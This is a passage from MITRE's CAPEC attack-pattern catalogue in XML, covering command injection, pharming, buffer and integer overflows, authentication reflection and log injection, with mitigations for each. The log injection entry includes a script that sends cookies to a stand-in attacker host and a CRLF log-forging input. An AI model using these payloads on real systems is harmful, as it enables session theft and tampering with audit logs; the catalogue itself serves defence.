               <Technique>Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)</Technique>
               <Technique>Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.</Description>
               <Technique>The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).</Technique>
               <Technique>The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).</Technique>
               <Technique>The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>User controllable input used as part of commands to the underlying operating system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve, though not always, knowledge of specific assembly commands for the platform.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.</Mitigation>
            <Mitigation>Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands</Mitigation>
            <Mitigation>All application processes should be run with the minimal privileges required. Also, processes must shed privileges as soon as they no longer require them.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line.</xhtml:p>
               <xhtml:p>An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data.</xhtml:p>See also: A vulnerability in Mozilla Firefox 1.x browser allows an attacker to execute arbitrary commands on the UNIX/Linux operating system. The vulnerability is caused due to the shell script used to launch Firefox parsing shell commands that are enclosed within back-ticks in the URL provided via the command line. This can be exploited to execute arbitrary shell commands by tricking a user into following a malicious link in an external application which uses Firefox as the default browser (e.g. the mail client Evolution on Red Hat Enterprise Linux 4).</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="78"/>
            <Related_Weakness CWE_ID="88"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-543"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="89" Name="Pharming" Abstraction="Standard" Status="Draft">
         <Description>A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to his site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="543"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="611"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="630"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="631"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="632"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Exploit</Phase>
               <Description>Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now "farm" sensitive information such as credentials or account numbers.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Vulnerable DNS software or improperly protected hosts file or router that can be poisoned</Prerequisite>
            <Prerequisite>A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to be able to poison the resolver - DNS entries or local hosts file or router entry pointing to a trusted DNS server - in order to successfully carry out a pharming attack. Setting up a fake website, identical to the targeted one, does not require special skills.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. Having knowledge of the way the target site has been structured, in order to create a fake version, is required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>All sensitive information must be handled over a secure connection.</Mitigation>
            <Mitigation>Known vulnerabilities in DNS or router software or in operating systems must be patched as soon as a fix has been released and tested.</Mitigation>
            <Mitigation>End users must ensure that they provide sensitive information only to websites that they trust, over a secure connection with a valid certificate issued by a well-known certificate authority.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An online bank website requires users to provide their customer ID and password to log on, but does not use a secure connection.</xhtml:p>
               <xhtml:p>An attacker can setup a similar fake site and leverage pharming to collect this information from unknowing victims.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="350"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="9" Name="Buffer Overflow in Local Command-Line Utilities" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets command-line utilities available in a number of shells. An attacker can leverage a vulnerability found in a command-line utility to escalate privilege to root.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Attacker identifies command utilities exposed by the target host.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>On the probing stage, the attacker interacts with the command utility and observes the results of its input. The attacker's goal is to uncover a buffer overflow in the command utility. For instance the attacker may find that input data are not properly validated.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker finds a buffer overflow vulnerability in the command utility and tries to exploit it. He crafts malicious code and injects it using the command utility. The attacker can at worst execute remote code on the target host.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target host exposes a command-line utility to the user.</Prerequisite>
            <Prerequisite>The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as buffer overflow.</Mitigation>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</Mitigation>
            <Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Operational: Use OS-level preventative functionality. Not a complete solution.</Mitigation>
            <Mitigation>Apply the latest patches to your user exposed services. This may not be a complete solution, especially against a zero day attack.</Mitigation>
            <Mitigation>Do not unnecessarily expose services.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: HPUX passwd</xhtml:div>
                  <xhtml:div>A buffer overflow in the HPUX passwd command allows local users to gain root privileges via a command-line option.</xhtml:div>
               </xhtml:div>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Solaris getopt</xhtml:div>
                  <xhtml:div>A buffer overflow in Solaris's getopt command (found in libc) allows local users to gain root privileges via a long argv[0].</xhtml:div>
               </xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="733"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="90" Name="Reflection Attack in Authentication Protocol" Abstraction="Detailed" Status="Draft">
         <Description>An attacker can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the attacker illegitimate access to the target system, without possessing the requisite credentials. Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An attacker can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="114"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker opens a connection to the target server and sends it a challenge</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The server responds by returning the challenge encrypted with a shared secret as well as its own challenge to the attacker</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>Since the attacker does not possess the shared secret, he initiates a second connection to the server and sends it, as challenge, the challenge received from the server on the first connection</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Experiment</Phase>
               <Description>The server treats this as just another handshake and responds by encrypting the challenge and issuing its own to the attacker</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker now receives the encrypted challenge on the second connection and sends it as response to the server on the first connection, thereby successfully completing the handshake and authenticating to the server.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity, such as a router or proxy, that handles these exchanges on behalf of the attacker inhibits the attackers' ability to attack the authentication protocol.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to have knowledge of observing the protocol exchange and managing the required connections in order to issue and respond to challenges</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>The server must initiate the handshake by issuing the challenge. This ensures that the client has to respond before the exchange can move any further</Mitigation>
            <Mitigation>The use of HMAC to hash the response from the server can also be used to thwart reflection. The server responds by returning its own challenge as well as hashing the client's challenge, its own challenge and the pre-shared secret. Requiring the client to respond with the HMAC of the two challenges ensures that only the possessor of a valid pre-shared secret can successfully hash in the two values.</Mitigation>
            <Mitigation>Introducing a random nonce with each new connection ensures that the attacker cannot employ two connections to attack the authentication protocol</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>A single sign-on solution for a network uses a fixed pre-shared key with its clients to initiate the sign-on process in order to avoid eavesdropping on the initial exchanges.</xhtml:p>
               <xhtml:p>An attacker can use a reflection attack to mimic a trusted client on the network to participate in the sign-on exchange.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="301"/>
            <Related_Weakness CWE_ID="303"/>
            <Related_Weakness CWE_ID="718"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="92" Name="Forced Integer Overflow" Abstraction="Detailed" Status="Draft">
         <Description>This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="128"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The first step is exploratory meaning the attacker looks for an integer variable that he can control.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker finds an integer variable that he can write into or manipulate and try to get the value of the integer out of the possible range.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The integer variable is forced to have a value out of range which set its final value to an unexpected value.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>The target host acts on the data and unexpected behavior may happen.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The attacker can manipulate the value of an integer variable utilized by the target host.</Prerequisite>
            <Prerequisite>The target host does not do proper range checking on the variable before utilizing it.</Prerequisite>
            <Prerequisite>When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow an integer by inserting an out of range value.</Skill>
            <Skill Level="High">Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.</Mitigation>
            <Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</Mitigation>
            <Mitigation>Always do bound checking before consuming user input data.</Mitigation>
            <Mitigation/>
         </Mitigations>
         <Example_Instances>
            <Example>Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544</Example>
            <Example>
               <xhtml:p>The following code illustrates an integer overflow. The declaration of total integer as "unsigned short int" assumes that the length of the first and second arguments fits in such an integer.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">include &lt;stdlib.h&gt;<xhtml:br/>include &lt;string.h&gt;<xhtml:br/>include &lt;stdio.h&gt;<xhtml:br/>
                  <xhtml:br/>int main (int argc, char *const *argv)<xhtml:br/>{<xhtml:div style="margin-left:10px;">if (argc !=3){<xhtml:div style="margin-left:10px;">printf("Usage: prog_name &lt;string1&gt; &lt;string2&gt;\n");<xhtml:br/>exit(-1);</xhtml:div>
                     <xhtml:br/>}<xhtml:br/>unsigned short int total;<xhtml:br/>total = strlen(argv[1])+strlen(argv[2])+1;<xhtml:br/>char * buff = (char *)malloc(total);<xhtml:br/>strcpy(buff, argv[1]);<xhtml:br/>strcpy(buff, argv[2]);</xhtml:div>
                  <xhtml:br/>}</xhtml:div>
               <xhtml:p>[R.92.4], [R.92.5]</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="190"/>
            <Related_Weakness CWE_ID="128"/>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="122"/>
            <Related_Weakness CWE_ID="196"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-131"/>
            <Reference External_Reference_ID="REF-546" Section="Integer overflow"/>
            <Reference External_Reference_ID="REF-547" Section="Test Case ID 1511"/>
            <Reference External_Reference_ID="REF-548" Section="Page 152, Figure 5-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="93" Name="Log Injection-Tampering-Forging" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing him to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="268"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="592"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine Application's Log File Format] The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.</Description>
               <Technique>Determine logging utility being used by application (e.g. log4j)</Technique>
               <Technique>Gain access to application's source code to determine log file formats.</Technique>
               <Technique>Install or obtain access to instance of application and observe its log file format.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</Description>
               <Technique>
                  <xhtml:p>Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example:</xhtml:p>
                  <xhtml:div style="margin-left:10px;" class="attack">"%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in"</xhtml:div>
                  <xhtml:p>may add the following forged entry into a log file:</xhtml:p>
                  <xhtml:div style="margin-left:10px;" class="result">"[Thu Nov 12 12:11:22]:Info: User admin logged in"</xhtml:div>
                  <xhtml:p>Different applications may require different encodings of the carriage return and line feed characters.</xhtml:p>
               </Technique>
               <Technique>
                  <xhtml:p>Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain</xhtml:p>
                  <xhtml:div style="margin-left:10px;" class="attack">&lt;script&gt;new Image().src="http://xss.attacker.com/log_cookie?cookie="+encodeURI(document.cookie);&lt;/script&gt;</xhtml:div>
                  <xhtml:p>The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</xhtml:p>
               </Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target host is logging the action and data of the user.</Prerequisite>
            <Prerequisite>The target host insufficiently protects access to the logs or logging mechanisms.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries.</Skill>
            <Skill Level="Medium">A more sophisticated attack can try to defeat the input validation mechanism.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Carefully control access to physical log files.</Mitigation>
            <Mitigation>Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data.</Mitigation>
            <Mitigation>Use synchronization to control the flow of execution.</Mitigation>
            <Mitigation>Use static analysis tools to identify log forging vulnerabilities.</Mitigation>
            <Mitigation>Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Dave Nielsen and Patrick Breitenbach PayPal Web Services (aka PHP Toolkit) 0.50, and possibly earlier versions, allows remote attackers to enter false payment entries into the log file via HTTP POST requests to ipn_success.php. See also: CVE-2006-0201</Example>
            <Example>
               <xhtml:p>If a user submits the string "twenty-one" for val, the following entry is logged:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="result">INFO: Failed to parse val=twenty-one</xhtml:div>
               <xhtml:p>However, if an attacker submits the string</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</xhtml:div>
               <xhtml:p>the following entry is logged:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="result">INFO: Failed to parse val=twenty-one<xhtml:br/>INFO: User logged out=badguy</xhtml:div>
               <xhtml:p>Clearly, attackers can use this same mechanism to insert arbitrary log entries.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="117"/>
            <Related_Weakness CWE_ID="75"/>
            <Related_Weakness CWE_ID="150"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1070</Entry_ID>
               <Entry_Name>Indicator Removal on Host</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-131"/>
            <Reference External_Reference_ID="REF-550"/>
            <Reference External_Reference_ID="REF-551" Section="Log injection"/>
            <Reference External_Reference_ID="REF-552" Section="Test Case ID 1579"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="94" Name="Man in the Middle Attack" Abstraction="Standard" Status="Draft">
         <Description>This type of attack targets the communication between two components (typically client and server). The attacker places himself in the communication channel between the two components. Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first goes to the attacker, who has the opportunity to observe or alter it, and it is then passed on to the other component as if it was never intercepted. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for Man-in-the-Middle attacks yields an implicit lack of trust in communication or identify between two components.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="22"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="185"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker probes to determine the nature and mechanism of communication between two components looking for opportunities to exploit.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
